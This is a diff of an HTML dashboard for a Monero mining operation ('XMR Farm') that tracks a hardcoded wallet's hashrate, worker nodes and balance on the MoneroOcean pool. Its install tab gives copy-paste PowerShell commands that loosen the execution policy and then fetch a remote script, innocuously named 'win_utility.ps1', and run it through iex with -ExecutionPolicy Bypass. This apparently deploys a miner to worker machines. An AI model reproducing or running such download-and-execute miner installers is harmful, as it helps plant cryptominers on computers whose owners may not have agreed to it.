@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XMR Farm: Pro Dashboard v14.0</title>
+    <title>XMR Farm: Pro Dashboard v14.2</title>
     <style>
         :root {
             --bg-color: #0b0f1a;
@@ -18,7 +18,6 @@
         * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
         body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', sans-serif; min-height: 100vh; }
 
-        /* Navigation */
         .nav-tabs {
             display: flex; justify-content: center; gap: 15px; padding: 20px 0;
             position: sticky; top: 0; background: rgba(11, 15, 26, 0.9); backdrop-filter: blur(15px); z-index: 100;
@@ -32,46 +31,38 @@
 
         .tab-btn.active { background: var(--accent-color); color: #000; box-shadow: 0 0 15px rgba(56, 189, 248, 0.4); }
 
-        /* Layout */
         .container { max-width: 1000px; margin: 0 auto; width: 95%; padding: 20px 0; }
         .section { display: none; animation: fadeIn 0.4s ease-out; }
         .section.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Stats Cards */
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin-bottom: 30px; }
         .stat-card { 
             background: var(--glass-bg); backdrop-filter: blur(10px); 
             border: 1px solid var(--glass-border); padding: 20px; border-radius: 16px; text-align: center;
             transition: 0.3s;
         }
-        .stat-card:hover { border-color: var(--accent-color); transform: translateY(-3px); }
-        .stat-card span { display: block; font-size: 0.75rem; opacity: 0.5; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; }
+        .stat-card span { display: block; font-size: 0.75rem; opacity: 0.5; text-transform: uppercase; margin-bottom: 8px; }
         .stat-card b { font-size: 1.5rem; display: block; }
 
         #balance_usd { color: var(--money-color); }
         #balance_uzs { color: var(--uzs-color); font-size: 0.95rem; margin-top: 5px; }
 
-        /* Worker Cards */
-        .log-container { 
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
-            gap: 15px; margin-top: 15px;
-        }
+        .log-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
+        
         .pc-card {
             background: var(--glass-bg); border: 1px solid var(--glass-border);
-            padding: 20px; border-radius: 16px; text-align: center; position: relative;
-            overflow: hidden;
+            padding: 20px; border-radius: 16px; text-align: center; position: relative; overflow: hidden;
         }
 
-        /* Cursor */
         .glass-cursor { 
-            position: fixed; width: 25px; height: 25px; background: rgba(255,255,255,0.05); 
+            position: fixed; width: 20px; height: 20px; background: rgba(255,255,255,0.1); 
             border-radius: 50%; pointer-events: none; z-index: 9999; backdrop-filter: blur(4px);
-            transform: translate(-50%, -50%); border: 1px solid rgba(255,255,255,0.15);
+            transform: translate(-50%, -50%); border: 1px solid rgba(255,255,255,0.2);
         }
 
-        .footer { text-align: center; padding: 40px 0; opacity: 0.3; font-size: 0.75rem; letter-spacing: 1px; }
-        code { display: block; background: #000; padding: 15px; border-radius: 8px; color: var(--accent-color); margin-top: 10px; word-break: break-all; }
+        .footer { text-align: center; padding: 40px 0; opacity: 0.3; font-size: 0.75rem; }
+        code { display: block; background: #000; padding: 15px; border-radius: 8px; color: var(--accent-color); margin-top: 10px; word-break: break-all; font-size: 0.8rem; }
     </style>
 </head>
 <body>
@@ -96,27 +87,28 @@
             </div>
         </div>
 
-        <h3 style="margin: 20px 0 10px 10px; font-size: 1rem; color: var(--accent-color); text-transform: uppercase;">Активные узлы</h3>
+        <h3 style="margin: 20px 0 15px 5px; font-size: 1rem; color: var(--accent-color); text-transform: uppercase;">Статус узлов</h3>
         <div id="logBox" class="log-container">Загрузка данных...</div>
     </section>
 
     <section id="install" class="section">
         <div class="stat-card" style="text-align: left; margin-bottom: 20px;">
-            <h3 style="color: var(--accent-color)">1. Разблокировка PowerShell</h3>
+            <h3>1. Разблокировка PowerShell</h3>
             <code onclick="copyCode(this)">Set-ExecutionPolicy RemoteSigned -Force</code>
         </div>
         <div class="stat-card" style="text-align: left;">
-            <h3 style="color: var(--accent-color)">2. Команда установки</h3>
+            <h3>2. Команда установки</h3>
             <code onclick="copyCode(this)">powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1' | iex"</code>
         </div>
     </section>
 
-    <div class="footer">MONERO OCEAN MONITOR | UZBEKISTAN | v14.0</div>
+    <div class="footer">MONERO OCEAN MONITOR | UZBEKISTAN | v14.2</div>
 </div>
 
 <script>
     const WALLET = '429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA';
-    let lastKnownPrice = 168; 
+    let xmrPrice = 168.50; 
+    let uzsRate = 12950;
 
     function openTab(tabId) {
         document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
@@ -127,95 +119,84 @@
 
     function copyCode(el) {
         navigator.clipboard.writeText(el.innerText);
-        el.style.borderColor = "var(--money-color)";
-        setTimeout(() => el.style.borderColor = "transparent", 600);
+        el.style.color = "var(--money-color)";
+        setTimeout(() => el.style.color = "var(--accent-color)", 600);
+    }
+
+    async function fetchRates() {
+        try {
+            const [resXMR, resUZS] = await Promise.all([
+                fetch('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd').then(r => r.json()),
+                fetch('https://open.er-api.com/v6/latest/USD').then(r => r.json())
+            ]);
+            xmrPrice = resXMR.monero.usd;
+            uzsRate = resUZS.rates.UZS;
+        } catch (e) { console.log("Используем стандартные курсы"); }
     }
 
     async function fetchAllData() {
+        await fetchRates();
         const logBox = document.getElementById('logBox');
         const ts = Date.now();
 
         try {
-            // Запрашиваем всё: общую статистику, список идентификаторов и подробности
             const [resStats, resIdent] = await Promise.all([
                 fetch(`https://api.moneroocean.stream/miner/${WALLET}/stats?_=${ts}`).then(r => r.json()),
                 fetch(`https://api.moneroocean.stream/miner/${WALLET}/identifiers?_=${ts}`).then(r => r.json())
             ]);
 
-            // Обновляем курс XMR (если CoinGecko молчит, используем старую цену)
-            try {
-                const resPrice = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd');
-                if (resPrice.ok) {
-                    const priceData = await resPrice.json();
-                    lastKnownPrice = priceData.monero.usd;
-                }
-            } catch (e) { console.log("Курс взят из кэша"); }
+            const xmrBalance = resStats.amtDue / 1e12;
+            const totalUSD = xmrBalance * xmrPrice;
+            const totalUZS = totalUSD * uzsRate;
 
-            const xmrBalance = resStats.amtDue / 1000000000000;
-            const currentUzsRate = 12950; 
-
-            // Заполнение шапки
             document.getElementById('hashrate').innerText = (resStats.hash2 / 1000).toFixed(2) + ' KH/s';
             document.getElementById('workers').innerText = resIdent.length || 0;
             document.getElementById('balance_xmr').innerText = xmrBalance.toFixed(6);
-            document.getElementById('balance_usd').innerText = '$' + (xmrBalance * lastKnownPrice).toFixed(2);
-            document.getElementById('balance_uzs').innerText = Math.round(xmrBalance * lastKnownPrice * currentUzsRate).toLocaleString() + ' UZS';
+            document.getElementById('balance_usd').innerText = '$' + totalUSD.toFixed(2);
+            document.getElementById('balance_uzs').innerText = Math.round(totalUZS).toLocaleString() + ' UZS';
 
             logBox.innerHTML = '';
 
             if (!resIdent || resIdent.length === 0) {
-                logBox.innerHTML = '<div style="grid-column: 1/-1; opacity:0.5; text-align:center;">Ожидание подключения воркеров...</div>';
+                renderCard("Общий узел (Слитный поток)", resStats.hash2, resStats.validShares);
             } else {
                 resIdent.forEach(pc => {
                     const name = pc.identifier || pc.id || "Miner Node";
-                    
-                    // Умное определение скорости
-                    let speed = pc.hash2 || pc.hash || pc.h || 0;
-                    if (speed === 0 && resStats.hash2 > 0) {
-                        speed = resStats.hash2 / resIdent.length; // Распределяем общую мощность
-                    }
-
-                    // Умное определение шар
-                    let shares = pc.validShares || pc.shares || 0;
-                    if (shares === 0 && resStats.validShares > 0) {
-                        shares = resStats.validShares / resIdent.length;
-                    }
-
-                    const isOnline = speed > 0;
-                    const statusColor = isOnline ? 'var(--accent-color)' : '#ef4444';
-                    
-                    const pcCard = document.createElement('div');
-                    pcCard.className = 'pc-card';
-                    pcCard.style.borderColor = isOnline ? 'var(--glass-border)' : 'rgba(239, 68, 68, 0.3)';
-
-                    pcCard.innerHTML = `
-                        <div style="font-size: 0.6rem; opacity: 0.4; text-transform: uppercase;">Node ID</div>
-                        <div style="font-weight: 800; color: #fff; margin-bottom: 12px; font-size: 1.1rem;">${name}</div>
-                        <div style="color: ${statusColor}; font-size: 1.4rem; font-weight: 900;">
-                            ${speed >= 1000 ? (speed/1000).toFixed(2) : Math.round(speed)} 
-                            <span style="font-size: 0.8rem;">${speed >= 1000 ? 'KH/s' : 'H/s'}</span>
-                        </div>
-                        <div style="margin-top: 10px; font-size: 0.8rem; background: rgba(0,0,0,0.3); padding: 5px; border-radius: 8px;">
-                            💎 <span style="color: var(--money-color)">${Math.round(shares)}</span> <span style="opacity:0.5">shares</span>
-                        </div>
-                        <div style="position: absolute; bottom: 0; left: 0; height: 4px; width: 100%; background: ${statusColor}; box-shadow: 0 0 10px ${statusColor};"></div>
-                    `;
-                    logBox.appendChild(pcCard);
+                    const speed = pc.hash2 || pc.hash || 0;
+                    const shares = pc.validShares || pc.shares || 0;
+                    if (name !== "global") renderCard(name, speed, shares);
                 });
             }
-        } catch (e) {
-            logBox.innerHTML = '<div style="color:#ef4444">Ошибка сети. Проверьте соединение.</div>';
-        }
+
+            function renderCard(name, speed, shares) {
+                const isOnline = speed > 0;
+                const color = isOnline ? 'var(--accent-color)' : '#ef4444';
+                const card = document.createElement('div');
+                card.className = 'pc-card';
+                card.style.borderColor = isOnline ? 'var(--glass-border)' : 'rgba(239, 68, 68, 0.3)';
+                card.innerHTML = `
+                    <div style="font-size: 0.6rem; opacity: 0.4; text-transform: uppercase;">Node ID</div>
+                    <div style="font-weight: 800; color: #fff; margin-bottom: 12px;">${name}</div>
+                    <div style="color: ${color}; font-size: 1.4rem; font-weight: 900;">
+                        ${speed >= 1000 ? (speed/1000).toFixed(2) : Math.round(speed)} 
+                        <span style="font-size: 0.8rem;">${speed >= 1000 ? 'KH/s' : 'H/s'}</span>
+                    </div>
+                    <div style="margin-top: 10px; font-size: 0.8rem; background: rgba(0,0,0,0.3); padding: 5px; border-radius: 8px;">
+                        💎 <span style="color: var(--money-color)">${Math.round(shares)}</span> <span style="opacity:0.5">shares</span>
+                    </div>
+                    <div style="position: absolute; bottom: 0; left: 0; height: 4px; width: 100%; background: ${color};"></div>
+                `;
+                logBox.appendChild(card);
+            }
+        } catch (e) { console.error(e); }
     }
 
-    // Cursor Movement
     const cursor = document.querySelector('.glass-cursor');
     document.addEventListener('mousemove', e => {
         cursor.style.left = e.clientX + 'px';
         cursor.style.top = e.clientY + 'px';
     });
 
-    // Start
     fetchAllData();
     setInterval(fetchAllData, 30000); 
 </script>
